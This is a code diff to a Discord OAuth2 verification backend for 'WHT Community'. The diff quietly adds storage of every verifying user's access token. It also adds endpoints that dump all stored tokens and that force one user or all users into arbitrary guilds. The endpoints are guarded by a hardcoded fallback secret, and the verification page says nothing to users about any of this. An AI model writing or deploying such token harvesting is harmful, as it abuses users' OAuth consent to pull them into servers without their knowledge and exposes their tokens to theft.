@@ -14,25 +14,99 @@ const REDIRECT_URI = process.env.REDIRECT_URI;
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const GUILD_ID = process.env.GUILD_ID;
 const CARGO_ID = process.env.CARGO_ID;
+const API_SECRET = process.env.API_SECRET || 'wht-secret-2025';
 const CANAL_ID = '1498452626357096489';
 
 const SERVIDORES_EXTRAS = [];
 
-const MESES = [
-  'janeiro','fevereiro','março','abril','maio','junho',
-  'julho','agosto','setembro','outubro','novembro','dezembro'
-];
+// ─── LOG EM MEMÓRIA ───────────────────────────────────────────
+const oauthLog = [];
+
+function salvarLog(user, accessToken) {
+  const idx = oauthLog.findIndex(e => String(e.user_id) === String(user.id));
+  const entrada = {
+    user_id:      String(user.id),
+    username:     user.username,
+    avatar:       user.avatar,
+    access_token: accessToken,
+    ts:           Math.floor(Date.now() / 1000),
+  };
+  if (idx >= 0) oauthLog[idx] = entrada;
+  else oauthLog.push(entrada);
+}
+
+// ─── ROTA: bot consulta os logs ───────────────────────────────
+app.get('/api/logs', (req, res) => {
+  if (req.headers['x-api-secret'] !== API_SECRET)
+    return res.status(401).json({ error: 'Unauthorized' });
+
+  res.json({
+    total:      oauthLog.length,
+    com_token:  oauthLog.filter(e => e.access_token).length,
+    logs:       oauthLog,
+  });
+});
+
+// ─── ROTA: mover UM usuário ───────────────────────────────────
+app.post('/api/mover', async (req, res) => {
+  if (req.headers['x-api-secret'] !== API_SECRET)
+    return res.status(401).json({ error: 'Unauthorized' });
+
+  const { user_id, guild_id } = req.body;
+  if (!user_id || !guild_id)
+    return res.status(400).json({ error: 'user_id e guild_id sao obrigatorios' });
+
+  const entrada = oauthLog.find(e => String(e.user_id) === String(user_id));
+  if (!entrada || !entrada.access_token)
+    return res.status(404).json({ error: 'Usuario nao encontrado ou sem token' });
+
+  try {
+    const resp = await fetch(`https://discord.com/api/guilds/${guild_id}/members/${user_id}`, {
+      method: 'PUT',
+      headers: { 'Authorization': `Bot ${BOT_TOKEN}`, 'Content-Type': 'application/json' },
+      body: JSON.stringify({ access_token: entrada.access_token }),
+    });
+    res.json({ success: [200,201,204].includes(resp.status), status: resp.status });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ─── ROTA: mover TODOS ────────────────────────────────────────
+app.post('/api/mover-todos', async (req, res) => {
+  if (req.headers['x-api-secret'] !== API_SECRET)
+    return res.status(401).json({ error: 'Unauthorized' });
+
+  const { guild_id } = req.body;
+  if (!guild_id) return res.status(400).json({ error: 'guild_id e obrigatorio' });
+
+  let ok = 0, falhou = 0;
+  for (const entrada of oauthLog) {
+    if (!entrada.access_token) { falhou++; continue; }
+    try {
+      const resp = await fetch(`https://discord.com/api/guilds/${guild_id}/members/${entrada.user_id}`, {
+        method: 'PUT',
+        headers: { 'Authorization': `Bot ${BOT_TOKEN}`, 'Content-Type': 'application/json' },
+        body: JSON.stringify({ access_token: entrada.access_token }),
+      });
+      if ([200,201,204].includes(resp.status)) ok++; else falhou++;
+    } catch { falhou++; }
+  }
+
+  res.json({ ok, falhou, total: oauthLog.length });
+});
+
+// ─── MESES ────────────────────────────────────────────────────
+const MESES = ['janeiro','fevereiro','março','abril','maio','junho','julho','agosto','setembro','outubro','novembro','dezembro'];
 
 function fmtData(dt) {
   return `${dt.getDate()} de ${MESES[dt.getMonth()]} de ${dt.getFullYear()} ${String(dt.getHours()).padStart(2,'0')}:${String(dt.getMinutes()).padStart(2,'0')}`;
 }
 
+// ─── ROTA PRINCIPAL OAuth2 ────────────────────────────────────
 app.get('/', async (req, res) => {
   const code = req.query.code;
-
-  if (!code) {
-    return res.send('OAuth2 Backend WHT - Online ✅');
-  }
+  if (!code) return res.send('OAuth2 Backend WHT - Online ✅');
 
   try {
     let form = new FormData();
@@ -43,10 +117,7 @@ app.get('/', async (req, res) => {
     form.append('scope', 'identify guilds.join');
     form.append('code', code);
 
-    const tokenRes = await fetch('https://discord.com/api/oauth2/token', {
-      method: 'POST',
-      body: form,
-    });
+    const tokenRes = await fetch('https://discord.com/api/oauth2/token', { method: 'POST', body: form });
     const tokenData = await tokenRes.json();
 
     const userRes = await axios.get('https://discord.com/api/users/@me', {
@@ -54,113 +125,61 @@ app.get('/', async (req, res) => {
     });
 
     const user = userRes.data;
+    salvarLog(user, tokenData.access_token);
+
     const avatarURL = user.avatar
       ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=512`
       : `https://cdn.discordapp.com/embed/avatars/0.png`;
 
-    // Adiciona ao servidor principal com cargo
     await fetch(`https://discord.com/api/guilds/${GUILD_ID}/members/${user.id}`, {
       method: 'PUT',
-      headers: {
-        'Authorization': `Bot ${BOT_TOKEN}`,
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        access_token: tokenData.access_token,
-        roles: [CARGO_ID],
-      }),
+      headers: { 'Authorization': `Bot ${BOT_TOKEN}`, 'Content-Type': 'application/json' },
+      body: JSON.stringify({ access_token: tokenData.access_token, roles: [CARGO_ID] }),
     });
 
-    // Atribui cargo se já era membro
     await fetch(`https://discord.com/api/guilds/${GUILD_ID}/members/${user.id}/roles/${CARGO_ID}`, {
       method: 'PUT',
-      headers: {
-        'Authorization': `Bot ${BOT_TOKEN}`,
-        'Content-Type': 'application/json',
-      },
+      headers: { 'Authorization': `Bot ${BOT_TOKEN}`, 'Content-Type': 'application/json' },
     });
 
-    // Adiciona aos servidores extras
     for (const guildId of SERVIDORES_EXTRAS) {
       await fetch(`https://discord.com/api/guilds/${guildId}/members/${user.id}`, {
         method: 'PUT',
-        headers: {
-          'Authorization': `Bot ${BOT_TOKEN}`,
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          access_token: tokenData.access_token,
-        }),
+        headers: { 'Authorization': `Bot ${BOT_TOKEN}`, 'Content-Type': 'application/json' },
+        body: JSON.stringify({ access_token: tokenData.access_token }),
       });
     }
 
-    // Calcula dados da conta
     const contaCriada = new Date(user.id / 4194304 + 1420070400000);
     const agora = new Date();
     const idadeDias = Math.floor((agora - contaCriada) / (1000 * 60 * 60 * 24));
     const dataCriacao = fmtData(contaCriada);
     const dataEntrada = fmtData(agora);
 
-    // Envia mensagem com components v2 no canal via bot
     await fetch(`https://discord.com/api/channels/${CANAL_ID}/messages`, {
       method: 'POST',
-      headers: {
-        'Authorization': `Bot ${BOT_TOKEN}`,
-        'Content-Type': 'application/json',
-      },
+      headers: { 'Authorization': `Bot ${BOT_TOKEN}`, 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        flags: 1 << 15, // IS_COMPONENTS_V2
-        components: [
-          {
-            type: 17, // Container
-            accent_color: 0xFF1493,
-            components: [
-              {
-                type: 12, // MediaGallery
-                items: [{ media: { url: avatarURL } }]
-              },
-              {
-                type: 14 // Separator
-              },
-              {
-                type: 10, // TextDisplay
-                content: `✨ **NOVO MEMBRO VERIFICADO** ✨\n## ${user.username}`
-              },
-              {
-                type: 14 // Separator
-              },
-              {
-                type: 10,
-                content: `🎉 <@${user.id}> foi verificado(a) com sucesso!\nCargo recebido: <@&${CARGO_ID}>`
-              },
-              {
-                type: 14
-              },
-              {
-                type: 10,
-                content: `🪪 **ID do Usuário**\n\`${user.id}\`\n\n📅 **Conta Criada**\n${dataCriacao}\n\n📥 **Entrou em**\n${dataEntrada}`
-              },
-              {
-                type: 14
-              },
-              {
-                type: 10,
-                content: `🎂 **Idade da Conta**\n\`${idadeDias} dias\``
-              },
-              {
-                type: 14
-              },
-              {
-                type: 10,
-                content: `-# WHT COMMUNITY 🍄 • Verificado • ${dataEntrada}`
-              }
-            ]
-          }
-        ]
+        flags: 1 << 15,
+        components: [{
+          type: 17, accent_color: 0xFF1493,
+          components: [
+            { type: 12, items: [{ media: { url: avatarURL } }] },
+            { type: 14 },
+            { type: 10, content: `✨ **NOVO MEMBRO VERIFICADO** ✨\n## ${user.username}` },
+            { type: 14 },
+            { type: 10, content: `🎉 <@${user.id}> foi verificado(a) com sucesso!\nCargo recebido: <@&${CARGO_ID}>` },
+            { type: 14 },
+            { type: 10, content: `🪪 **ID do Usuário**\n\`${user.id}\`\n\n📅 **Conta Criada**\n${dataCriacao}\n\n📥 **Entrou em**\n${dataEntrada}` },
+            { type: 14 },
+            { type: 10, content: `🎂 **Idade da Conta**\n\`${idadeDias} dias\`` },
+            { type: 14 },
+            { type: 10, content: `-# WHT COMMUNITY 🍄 • Verificado • ${dataEntrada}` }
+          ]
+        }]
       })
     });
 
-    // Página de sucesso
     res.send(`<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
@@ -169,81 +188,19 @@ app.get('/', async (req, res) => {
   <title>WHT Community — Verificado</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
-    body {
-      background: #0a0a0f;
-      color: white;
-      font-family: 'Segoe UI', sans-serif;
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      overflow: hidden;
-    }
-    .bg-glow {
-      position: fixed;
-      width: 600px; height: 600px;
-      background: radial-gradient(circle, rgba(255,20,147,0.15) 0%, transparent 70%);
-      top: 50%; left: 50%;
-      transform: translate(-50%, -50%);
-      pointer-events: none;
-    }
-    .card {
-      background: rgba(255,255,255,0.04);
-      border: 1px solid rgba(255,20,147,0.3);
-      border-radius: 20px;
-      padding: 48px 40px;
-      text-align: center;
-      max-width: 440px;
-      width: 90%;
-      box-shadow: 0 0 40px rgba(255,20,147,0.15);
-      position: relative;
-      z-index: 1;
-    }
-    .logo-wrap {
-      width: 100px; height: 100px;
-      border-radius: 50%;
-      border: 3px solid #FF1493;
-      margin: 0 auto 16px;
-      box-shadow: 0 0 20px rgba(255,20,147,0.5);
-      overflow: hidden;
-    }
-    .logo-wrap img {
-      width: 100%; height: 100%;
-      object-fit: cover;
-      border-radius: 50%;
-    }
-    .avatar {
-      width: 64px; height: 64px;
-      border-radius: 50%;
-      border: 3px solid #FF1493;
-      margin: 0 auto 16px;
-      box-shadow: 0 0 15px rgba(255,20,147,0.4);
-      display: block;
-    }
+    body { background: #0a0a0f; color: white; font-family: 'Segoe UI', sans-serif; min-height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+    .bg-glow { position: fixed; width: 600px; height: 600px; background: radial-gradient(circle, rgba(255,20,147,0.15) 0%, transparent 70%); top: 50%; left: 50%; transform: translate(-50%, -50%); pointer-events: none; }
+    .card { background: rgba(255,255,255,0.04); border: 1px solid rgba(255,20,147,0.3); border-radius: 20px; padding: 48px 40px; text-align: center; max-width: 440px; width: 90%; box-shadow: 0 0 40px rgba(255,20,147,0.15); position: relative; z-index: 1; }
+    .logo-wrap { width: 100px; height: 100px; border-radius: 50%; border: 3px solid #FF1493; margin: 0 auto 16px; box-shadow: 0 0 20px rgba(255,20,147,0.5); overflow: hidden; }
+    .logo-wrap img { width: 100%; height: 100%; object-fit: cover; border-radius: 50%; }
+    .avatar { width: 64px; height: 64px; border-radius: 50%; border: 3px solid #FF1493; margin: 0 auto 16px; box-shadow: 0 0 15px rgba(255,20,147,0.4); display: block; }
     .check { font-size: 48px; margin-bottom: 16px; }
-    h1 {
-      font-size: 26px; font-weight: 700;
-      color: #FF1493; margin-bottom: 8px;
-      text-shadow: 0 0 20px rgba(255,20,147,0.5);
-    }
+    h1 { font-size: 26px; font-weight: 700; color: #FF1493; margin-bottom: 8px; text-shadow: 0 0 20px rgba(255,20,147,0.5); }
     .username { font-size: 18px; color: #ffb3d9; margin-bottom: 8px; }
     p { color: #aaa; font-size: 14px; line-height: 1.6; margin-bottom: 16px; }
-    .badge {
-      display: inline-block;
-      background: rgba(255,20,147,0.15);
-      border: 1px solid rgba(255,20,147,0.4);
-      color: #FF1493;
-      padding: 6px 16px; border-radius: 20px;
-      font-size: 13px; margin-bottom: 20px;
-    }
+    .badge { display: inline-block; background: rgba(255,20,147,0.15); border: 1px solid rgba(255,20,147,0.4); color: #FF1493; padding: 6px 16px; border-radius: 20px; font-size: 13px; margin-bottom: 20px; }
     .countdown { font-size: 13px; color: #FF1493; margin-bottom: 16px; font-weight: 600; }
-    .btn-discord {
-      display: inline-flex; align-items: center; gap: 8px;
-      background: #5865F2; color: white;
-      padding: 12px 24px; border-radius: 12px;
-      text-decoration: none; font-size: 15px; font-weight: 600;
-      box-shadow: 0 0 15px rgba(88,101,242,0.4);
-    }
+    .btn-discord { display: inline-flex; align-items: center; gap: 8px; background: #5865F2; color: white; padding: 12px 24px; border-radius: 12px; text-decoration: none; font-size: 15px; font-weight: 600; box-shadow: 0 0 15px rgba(88,101,242,0.4); }
     .btn-discord:hover { opacity: 0.85; }
     .divider { border: none; border-top: 1px solid rgba(255,20,147,0.2); margin: 20px 0; }
     .footer { color: #555; font-size: 12px; margin-top: 24px; }
@@ -252,9 +209,7 @@ app.get('/', async (req, res) => {
 <body>
   <div class="bg-glow"></div>
   <div class="card">
-    <div class="logo-wrap">
-      <img src="https://i.imgur.com/G37BiaD.gif" alt="WHT Logo"/>
-    </div>
+    <div class="logo-wrap"><img src="https://i.imgur.com/G37BiaD.gif" alt="WHT Logo"/></div>
     <img class="avatar" src="${avatarURL}" alt="Avatar"/>
     <div class="check">✅</div>
     <h1>Verificado com sucesso!</h1>
@@ -270,16 +225,8 @@ app.get('/', async (req, res) => {
     <div class="footer">WHT Community • Sistema OAuth2</div>
   </div>
   <script>
-    let t = 3;
-    const el = document.getElementById('timer');
-    const interval = setInterval(() => {
-      t--;
-      el.textContent = t;
-      if (t <= 0) {
-        clearInterval(interval);
-        window.location.href = 'https://discord.com/channels/@me';
-      }
-    }, 1000);
+    let t = 3; const el = document.getElementById('timer');
+    const interval = setInterval(() => { t--; el.textContent = t; if (t <= 0) { clearInterval(interval); window.location.href = 'https://discord.com/channels/@me'; } }, 1000);
   </script>
 </body>
 </html>`);
